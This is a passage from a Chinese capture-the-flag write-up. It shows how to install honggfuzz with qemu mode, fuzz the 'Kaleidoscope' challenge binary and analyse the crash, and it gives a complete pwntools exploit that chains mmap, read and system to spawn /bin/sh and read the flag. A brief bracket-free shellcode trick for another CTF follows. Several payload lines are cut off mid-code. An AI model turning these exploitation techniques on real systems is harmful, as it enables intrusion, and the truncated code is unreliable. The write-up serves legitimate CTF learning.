首先我们需要拉取项目
    git clone https://github.com/google/honggfuzz.git
    cd honggfuzz
然后需要安装相关的依赖库文件
    apt-get install libbfd-dev libunwind8-dev clang-5.0 lzma-dev
接下来需要确认`lzma`的存在：
    locate lzma
如果发现只有`liblzma.so.x`文件，那么需要建立一个符号链接
    sudo ln -s /lib/x86_64-linux-gnu/liblzma.so.5 /lib/x86_64-linux-gnu/liblzma.so
接下来执行以下命令来完成编译安装：
    sudo make
    cp libhfcommon includes/libhfcommon
    cp libhfnetdriver includes/libhfnetdriver
    cp libhfuzz includes/libhfuzz
    sudo make install
至此，我们的`honggfuzz`主程序安装结束。
#### 安装`honggfuzz-qemu`(以`ubuntu 16.04`为例)
接下来因为我们要进行`fuzz`的是黑盒状态下的程序，因此我们需要使用`qemu`模式来辅助我们监控`fuzz`的代码覆盖率，那么`honggfuzz`为我们提供了`honggfuzz`的`MAKEFILE`，我们直接使用如下命令即可安装
    cd qemu_mode
    make
    sudo apt-get install libpixman-1-dev
    cd honggfuzz-qemu && make
⚠️：使用`docker`化的`honggfuzz`时会产生变量类型的报错，目前没有找到解决方式，已经提了`issue`，因此不建议使用`docker`化的`honggfuzz`安装`honggfuzz-qemu`。
⚠️：安装时会使用`git`安装不同的几个包。
####  启动测试
安装完毕后我们就可以启动`fuzz`测试了
    honggfuzz -f /work/in/ -s -- ./qemu_mode/honggfuzz-qemu/x86_64-linux-user/qemu-x86_64 /work/Kaleidoscope
其中，`/work/in/`是语料库文件夹，将我们所需要的种子语料以`txt`形式放置在语料库文件夹即可。
可以发现，在`1 h 25 min`分钟的时间里，就已经触发了一些`crash`：
###  漏洞分析
我们可以查看当前文件夹下生成的`crash`文件，里面存储了产生此`crash`所使用的输入样本，我们注意到，在这`14`个样本中，有一个形如:
    def fib(x)
        if x  ')
    sh.sendline(payload)
    sleep(0.5)
    sh.recvuntil('ready> ')
    sh.sendline('1')
    sh.interactive()
可以发现，的确调用了`libc`内的函数，且发现其参数正是我们传入的`1234`。
###  漏洞利用
那么我们只需要先调用`mmap(1048576, 4096, 7, 34, 0)`来分配一段空间以用来存储我们的`/bin/sh`
然后调用`read(0,1048576,10)`来读取我们的`/bin/sh`，最后再调用`system(1048576)`即可`getshell`
###  Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    Kaleidoscope=ELF('./Kaleidoscope', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./Kaleidoscope")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./Kaleidoscope")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        if ip != None and port !=None:
            try:
                sh = remote(ip,port)
            except:
                return 'ERROR : Can not connect to target server!'
        try:
            # Your Code here
            payload = """
            def mmap(x y z o p)
                if x  ')
            # get_gdb(sh)
            sh.sendline(payload)
            sleep(0.5)
            payload = """
            def read(x y z)
                if m  ')
            sh.sendline(payload)
            sh.recvuntil('ready> ')
            sh.sendline('/bin/shx00')
            sh.interactive()
            flag=get_flag(sh)
            # try:
            #     Multi_Attack()
            # except:
            #     throw('Multi_Attack_Err')
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            return 'ERROR : Runtime error!'
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x08 以 2020 DAS-CTF OJ1 为例
> 安恒月赛的题目为闭源信息，本例题不会给出任何形式的附件下载地址
###  解题思路
题目要求我们输入不带括号的C代码来执行，注意，此处的程序要求我们不允许带有任何形式的括号，包括大括号，中括号，小括号，这就使得我们无法通过常规的`C`代码形式提交，例如`int
main(){}`等等，这里我们给出一种奇特的可运行的`C`代码形式。
    const char main=0x55,a1=0x48,a2=0x89,a3=0xe5;
例如我们直接编译以上代码，在`main`处下断
那么我们直接找到对应汇编码即可。
## 0x09 参考链接
[【原】[Redhat2019] Kaleidoscope –
matshao](http://matshao.com/2019/11/11/Redhat2019-Kaleidoscope/)